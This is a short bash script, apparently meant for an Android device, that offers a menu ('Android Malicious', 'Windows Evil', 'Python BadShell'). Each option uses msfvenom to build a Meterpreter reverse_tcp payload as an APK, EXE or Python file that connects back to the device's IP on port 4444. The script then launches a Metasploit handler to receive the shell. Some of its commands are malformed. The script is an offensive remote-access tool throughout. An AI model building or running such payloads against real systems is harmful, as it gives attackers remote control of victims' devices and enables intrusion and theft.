#!/bin/bash

i="0"
resize -s 27 80		
clear
while [ $i -lt 1 ]
do
clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1 )


echo -e '\e[1:33m

\e[1;32m
IP = $ip

(1) Android Malicious
(2) Windows Evil
(3) Python BadShell	
'

service postgresql start
apk='1'
exe='2'
py='3'

read x

if [ "$x" == "$apk" ]; then 
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 -f apk > /sdcard/app.apk
echo -e '
!!!!!!!!!!!!!!!!!
!!Payload listo!!
!!!!!!!!!!!!!!!!!

'
msfconsole -q " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost=$ip ; set lport=4444 ; exploit ;"

elif [ "$x" == "$exe" ]; then                    #EXE
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /sdcard/evil.exe
echo -e '
!!!!!!!!!!!!!!!!!
!!Payload listo!!
!!!!!!!!!!!!!!!!!
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$py" ]; then                       #PYTHON
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /sdcard/ducky.py
echo -e '
!!!!!!!!!!!!!!!!!
!!Payload listo!!
!!!!!!!!!!!!!!!!!
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

read

else

n


fi


done